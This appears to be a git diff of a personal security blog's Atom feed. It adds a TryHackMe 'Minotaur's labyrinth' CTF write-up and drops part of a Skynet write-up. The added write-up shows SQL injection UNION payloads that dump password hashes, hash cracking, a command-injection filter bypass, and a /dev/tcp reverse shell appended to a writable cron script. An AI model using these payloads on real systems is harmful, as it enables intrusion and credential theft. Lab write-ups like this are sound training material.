@@ -1,4 +1,376 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2021-10-26T07:52:25+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">CRTP Review</title><link href="https://darrynbrownfield.co.uk/crtp" rel="alternate" type="text/html" title="CRTP Review" /><published>2021-10-25T00:00:00+00:00</published><updated>2021-10-25T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/crtp</id><content type="html" xml:base="https://darrynbrownfield.co.uk/crtp">&lt;p&gt;&lt;img src=&quot;/assets/images/crtp/cover1.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2021-11-07T15:36:06+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Minotaur’s labyrinth Write Up</title><link href="https://darrynbrownfield.co.uk/minotaurslabyrinth" rel="alternate" type="text/html" title="Minotaur's labyrinth Write Up" /><published>2021-11-07T00:00:00+00:00</published><updated>2021-11-07T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/minotaurslabyrinth</id><content type="html" xml:base="https://darrynbrownfield.co.uk/minotaurslabyrinth">&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/labyrinth8llv&quot;&gt;Minotaur’s labyrinth&lt;/a&gt; is a medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/xenox&quot;&gt;xenox&lt;/a&gt; and &lt;a href=&quot;https://tryhackme.com/p/spayc&quot;&gt;spayc&lt;/a&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The Minotaur threw a fit and captured some people in the Labyrinth. Are you able to help Daedalus free them?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;I started a nmap scan to check for available ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# Nmap 7.91 scan initiated Sun Nov  7 12:41:10 2021 as: nmap -sC -sV -oA nmap/initial 10.10.68.118
+Nmap scan report for 10.10.68.118
+Host is up (0.044s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      ProFTPD
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15 14:57 pub
+80/tcp   open  http     Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
+|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
+| http-title: Login
+|_Requested resource was login.html
+443/tcp  open  ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
+|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
+| http-title: Login
+|_Requested resource was login.html
+| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
+| Not valid before: 2004-10-01T09:10:30
+|_Not valid after:  2010-09-30T09:10:30
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+3306/tcp open  mysql?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, Help, Kerberos, NULL, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|_    Host 'ip-10-8-21-217.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.91%I=7%D=11/7%Time=6187C968%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.i
+SF:nternal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Mari
+SF:aDB\x20server&quot;)%r(GenericLines,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-2
+SF:1-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20c
+SF:onnect\x20to\x20this\x20MariaDB\x20server&quot;)%r(GetRequest,68,&quot;d\0\0\x01\
+SF:xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x2
+SF:0not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r
+SF:(RTSPRequest,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.
+SF:compute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th
+SF:is\x20MariaDB\x20server&quot;)%r(DNSVersionBindReqTCP,68,&quot;d\0\0\x01\xffj\x04
+SF:Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20
+SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(DNSStat
+SF:usRequestTCP,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.
+SF:compute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th
+SF:is\x20MariaDB\x20server&quot;)%r(Help,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8
+SF:-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x2
+SF:0connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(SSLSessionReq,68,&quot;d\0\0
+SF:\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20
+SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
+SF:r&quot;)%r(TerminalServerCookie,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-21
+SF:7\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20conne
+SF:ct\x20to\x20this\x20MariaDB\x20server&quot;)%r(TLSSessionReq,68,&quot;d\0\0\x01\x
+SF:ffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20
+SF:not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(
+SF:Kerberos,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.comp
+SF:ute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x
+SF:20MariaDB\x20server&quot;)%r(SMBProgNeg,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10
+SF:-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\
+SF:x20connect\x20to\x20this\x20MariaDB\x20server&quot;);
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Nov  7 12:41:26 2021 -- 1 IP address (1 host up) scanned in 16.38 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;4 ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;21 - FTP - ProFTPD&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - Apache httpd 2.4.48&lt;/li&gt;
+  &lt;li&gt;443 - HTTPS - Apache httpd 2.4.48&lt;/li&gt;
+  &lt;li&gt;3306 - MYSQL - MariaDB server&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;FTP allows anonymous access so I started by looking for anything interesting in there.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ftp 10.10.68.118                                                   
+Connected to 10.10.68.118.                                               
+220 ProFTPD Server (ProFTPD) [::ffff:10.10.68.118]                       
+Name (10.10.68.118:daz): anonymous                                       
+331 Anonymous login ok, send your complete email address as your password
+Password:
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls -lah
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 .
+drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
+drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 pub
+226 Transfer complete
+ftp&amp;gt; cd pub
+250 CWD command successful
+ftp&amp;gt; ls -lah
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 .
+drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
+drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .secret
+-rw-r--r--   1 root     root          141 Jun 15 14:57 message.txt
+226 Transfer complete
+ftp&amp;gt; get message.txt
+local: message.txt remote: message.txt
+200 PORT command successful
+150 Opening BINARY mode data connection for message.txt (141 bytes)
+226 Transfer complete
+141 bytes received in 0.00 secs (140.2193 kB/s)
+ftp&amp;gt; cd .secret
+250 CWD command successful
+ftp&amp;gt; ls -lah
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 .
+drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
+drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 pub
+226 Transfer complete
+ftp&amp;gt; cd pub
+250 CWD command successful
+ftp&amp;gt; ls -lah
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 .
+drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
+drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .secret
+-rw-r--r--   1 root     root          141 Jun 15 14:57 message.txt
+226 Transfer complete
+ftp&amp;gt; get message.txt
+local: message.txt remote: message.txt
+200 PORT command successful
+150 Opening BINARY mode data connection for message.txt (141 bytes)
+226 Transfer complete
+141 bytes received in 0.00 secs (140.2193 kB/s)
+ftp&amp;gt; cd .secret
+250 CWD command successful
+ftp&amp;gt; ls -lah
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .
+drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 ..
+-rw-r--r--   1 root     root           30 Jun 15 19:49 flag.txt
+-rw-r--r--   1 root     root          114 Jun 15 14:56 keep_in_mind.txt
+226 Transfer complete
+ftp&amp;gt; get keep_in_mind.txt
+local: keep_in_mind.txt remote: keep_in_mind.txt
+200 PORT command successful
+150 Opening BINARY mode data connection for keep_in_mind.txt (114 bytes)
+226 Transfer complete
+114 bytes received in 0.01 secs (12.2017 kB/s)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Not much in there, I downloaded the message.txt and keep_in_mind.txt files.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat message.txt keep_in_mind.txt 
+Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
+-- Minotaur
+Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
+-- Minotaur
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;No credentials or anything that jumps out other than probably a cronjob being used somewhere that I should keep an eye out for. I turned my attention to the web ports and got a login prompt.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried the normal admin/admin, admin/password etc but nothing worked. Its never going to be that easy to get root by I did click the link and just got a page with the two creators.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/roottroll.png&quot; alt=&quot;roottroll&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The forget password link was also a troll!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/passwdtroll.png&quot; alt=&quot;passwdtroll&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I had a look at the source but nothing jumped out expect a javascript file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/websource.png&quot; alt=&quot;websource&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Great a username ‘Daedalus’! Also a basic password generating function.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/loginjs.png&quot; alt=&quot;loginjs&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Rather than doing manually, I put the function in to a python script and got the users password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat pwdgen.py 
+
+a = [&quot;0&quot;, &quot;h&quot;, &quot;?&quot;, &quot;1&quot;, &quot;v&quot;, &quot;4&quot;, &quot;r&quot;, &quot;l&quot;, &quot;0&quot;, &quot;g&quot;]
+b = [&quot;m&quot;, &quot;w&quot;, &quot;7&quot;, &quot;j&quot;, &quot;1&quot;, &quot;e&quot;, &quot;8&quot;, &quot;l&quot;, &quot;r&quot;, &quot;a&quot;, &quot;2&quot;]
+c = [&quot;c&quot;, &quot;k&quot;, &quot;h&quot;, &quot;p&quot;, &quot;q&quot;, &quot;9&quot;, &quot;w&quot;, &quot;v&quot;, &quot;5&quot;, &quot;p&quot;, &quot;4&quot;]
+
+print(a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8])
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried the username and generated password and was able to successfully login to the portal.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/loggedin.png&quot; alt=&quot;loggedin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The webpage has a simple search feature, the table looks like database columns and with the NMAP showing a SQL database its safe to assume this search function will query the database.&lt;/p&gt;
+
+&lt;p&gt;I tested some basic queries and it appears the search function is vulnerable to SQLi. When I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt; character I got an error ‘No callback’ however if I entered &lt;code class=&quot;highlighter-rouge&quot;&gt;';-- -&lt;/code&gt; I don’t get an error which indicates I’m completing the SQL command by commenting out the rest of the query.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/sqlitest.gif&quot; alt=&quot;sqlitest&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Because of the output page at the bottom I assumed I could use UNION SELECT to get results from the database and display on the page. There are 3 columns on the page so I tried the UNION SELECT statement &lt;code class=&quot;highlighter-rouge&quot;&gt;' union select 1,2,3;-- -&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/sqlidatabase.gif&quot; alt=&quot;sqlidatabase&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So far so good! From the drop down is People &amp;amp; Creatures so rather enumerating for other tables I decided to look at at the columns for these tables with the command&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;'UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='people';-- -&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/tablecolumns.png&quot; alt=&quot;tablecolumns&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This provided the column names:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;idPeople&lt;/li&gt;
+  &lt;li&gt;namePeople&lt;/li&gt;
+  &lt;li&gt;passwordPeople&lt;/li&gt;
+  &lt;li&gt;permissionPeople&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Now with the query &lt;code class=&quot;highlighter-rouge&quot;&gt;'UNION SELECT 1,namePeople,passwordPeople from people;-- -&lt;/code&gt; I could get a list of the names and passwords.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/sqluserlist.png&quot; alt=&quot;sqluserlist&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I also wanted to see the permissions to each person so did another query to get this information, there is probably a way to use group concat to put all the information on one line but I just did a second query.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/peoplepermission.png&quot; alt=&quot;peoplepermission&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;M!n0taur is an admin. I put all the names and password hashes in to a file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat peoplecreds 
+Eurycliedes:42354020b68c7ed28dcdeabd5a2baf8e
+Menekrates:0b3bebe266a81fbfaa79db1604c4e67f
+Philostratos:b83f966a6f5a9cff9c6e1c52b0aa635b
+Daedalus:b8e4c23686a3a12476ad7779e35f5eb6
+M!n0taur:1765db9457f496a39859209ee81fbda4
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now using the command &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat -m 0 peoplecreds /usr/share/wordlists/rockyou.txt --username&lt;/code&gt; I can use hashcat to crack the hashes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/crackedusers.png&quot; alt=&quot;crackedusers&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I logged out of the portal and back in with M!n0taur’s credentials and now had admin access.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/adminpage.png&quot; alt=&quot;adminpage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A new link is presented ‘Secret Stuff’, navigating to this page give us another input box but this time echoing what ever we enter.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/echopage.png&quot; alt=&quot;echopage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I did some basic tests and using pipe &lt;code class=&quot;highlighter-rouge&quot;&gt;|&lt;/code&gt; allowed me to get command injection. 
+&lt;img src=&quot;/assets/images/minotaurslabyrinth/echotest.gif&quot; alt=&quot;echotest&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+
+&lt;p&gt;With the ability to run commands on the target I tried to get a reverseshell back to my machine, however none of my payloads worked and I got the following message.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/errormessage.png&quot; alt=&quot;errormessage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Because I could execute commands, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; and could see the echo.php page I was trying to exploit, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; to reach the source code and found a regex checking my input.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/regex.gif&quot; alt=&quot;regex&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A good resource for testing regex is &lt;a href=&quot;https://regexr.com&quot;&gt;https://regexr.com&lt;/a&gt;, I put in the expression and could see a range of characters are being matched, all the reverse shell payloads were matching the expression.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/regexcompare.png&quot; alt=&quot;regexcompare&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So so get around this, I encoded my payload as base64, another great resource is &lt;a href=&quot;https://www.revshells.com&quot;&gt;https://www.revshells.com&lt;/a&gt;. Put in your IP and port and you can pick the type of reverse shell you want and then encode it with base64.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/genshell.png&quot; alt=&quot;genshell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I used the python3 payload, once thing to note is the regex will check for &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt; so your payload must not need padding once encoded to base64.&lt;/p&gt;
+
+&lt;p&gt;Now with my payloaded encoded, I started a listener and on the echo page I entered &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;base64 string&amp;gt; | base64 -d | bash&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [THMVPNIP] from (UNKNOWN) [10.10.68.118] 41916
+bash: /root/.bashrc: Permission denied
+daemon@labyrinth:/opt/lampp/htdocs$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I finally had a shell!&lt;/p&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+
+&lt;p&gt;While enumerating the machine I found a folder called ‘reminders’ which is not a standard folder.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;daemon@labyrinth:/$ ls
+ls
+bin    home            lost+found  reminders  srv       usr
+boot   initrd.img      media       root       swapfile  var
+cdrom  initrd.img.old  mnt         run        sys       vmlinuz
+dev    lib             opt         sbin       timers    vmlinuz.old
+etc    lib64           proc        snap       tmp
+daemon@labyrinth:/$ cd reminders
+cd reminders
+daemon@labyrinth:/reminders$ ls -lah
+ls -lah
+total 44K
+drwxr-xr-x  2 root root 4,0K jún   15 17:25 .
+drwxr-xr-x 26 root root 4,0K szept 20 08:42 ..
+-rw-r--r--  1 root root  31K nov    7 14:36 dontforget.txt
+daemon@labyrinth:/reminders$ date
+date
+2021. nov. 7., vasárnap, 14:36:07 CET
+daemon@labyrinth:/reminders$ 
+daemon@labyrinth:/reminders$ tail dontforget.txt
+tail dontforget.txt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The ‘dontforget.txt’ file is being regularly updated, thinking back at the text files from the FTP service there is probably a cron job running. Looking around the machine further I found a timers folder.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;daemon@labyrinth:/reminders$ cd /timers
+cd /timers
+daemon@labyrinth:/timers$ ls
+ls
+timer.sh
+daemon@labyrinth:/timers$ ls -lah timer.sh
+ls -lah timer.sh
+-rwxrwxrwx 1 root root 117 nov    7 14:38 timer.sh
+daemon@labyrinth:/timers$ cat timer.sh
+cat timer.sh
+#!/bin/bash
+echo &quot;dont fo...forge...ttt&quot; &amp;gt;&amp;gt; /reminders/dontforget.txt
+daemon@labyrinth:/timers$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is the script adding entries to the text file in the reminders folder and we have full write access. So I appended another reverse shell now calling port 5555.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;daemon@labyrinth:/timers$ echo '/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/THMVPNIP/5555 0&amp;gt;&amp;amp;1' &amp;gt;&amp;gt; timer.sh
+&amp;lt;h -i &amp;gt;&amp;amp; /dev/tcp/THMVPNIP/5555 0&amp;gt;&amp;amp;1' &amp;gt;&amp;gt; timer.sh
+daemon@labyrinth:/timers$ cat timer.sh
+cat timer.sh
+#!/bin/bash
+echo &quot;dont fo...forge...ttt&quot; &amp;gt;&amp;gt; /reminders/dontforget.txt
+/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/THMVPNIP/5555 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Started a listener and waiting for the script to run and got a shell as root!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 5555
+listening on [any] 5555 ...
+connect to [THMVPNIP] from (UNKNOWN) [10.10.68.118] 38120
+bash: cannot set terminal process group (6018): Inappropriate ioctl for device
+bash: no job control in this shell
+root@labyrinth:~# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="medium" /><summary type="html"></summary></entry><entry><title type="html">CRTP Review</title><link href="https://darrynbrownfield.co.uk/crtp" rel="alternate" type="text/html" title="CRTP Review" /><published>2021-10-25T00:00:00+00:00</published><updated>2021-10-25T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/crtp</id><content type="html" xml:base="https://darrynbrownfield.co.uk/crtp">&lt;p&gt;&lt;img src=&quot;/assets/images/crtp/cover1.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I have recently completed the &lt;a href=&quot;https://www.pentesteracademy.com/activedirectorylab&quot;&gt;Attacking and Defending Active Directory&lt;/a&gt; course from Pentester Academy and wanted to share my thoughts for anyone looking to take the course and take the CTRP exam.&lt;/p&gt;
 
@@ -2277,301 +2649,4 @@ uid=0(root) gid=0(root) groups=0(root)
 root@keldagrim:/dev/shm# 
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="medium" /><summary type="html"></summary></entry><entry><title type="html">Skynet Write Up</title><link href="https://darrynbrownfield.co.uk/skynet" rel="alternate" type="text/html" title="Skynet Write Up" /><published>2021-01-30T00:00:00+00:00</published><updated>2021-01-30T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/skynet</id><content type="html" xml:base="https://darrynbrownfield.co.uk/skynet">&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/cover.png&quot; alt=&quot;skynet&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/skynet&quot;&gt;Skynet&lt;/a&gt; is a easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Are you able to compromise this Terminator themed machine?&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;I deployed the machine and was given the target IP 10.10.120.207. I started a NMAP scan to check the available ports.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.120.207
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-24 16:37 GMT
-Nmap scan report for 10.10.120.207
-Host is up (0.032s latency).
-Not shown: 994 closed ports
-PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
-|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
-|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
-80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Skynet
-110/tcp open  pop3        Dovecot pop3d
-|_pop3-capabilities: AUTH-RESP-CODE CAPA PIPELINING RESP-CODES UIDL SASL TOP
-139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-143/tcp open  imap        Dovecot imapd
-|_imap-capabilities: Pre-login IMAP4rev1 ENABLE LOGINDISABLEDA0001 more LOGIN-REFERRALS have SASL-IR listed ID capabilities LITERAL+ post-login IDLE OK
-445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
-Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
-|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
-| smb-os-discovery:
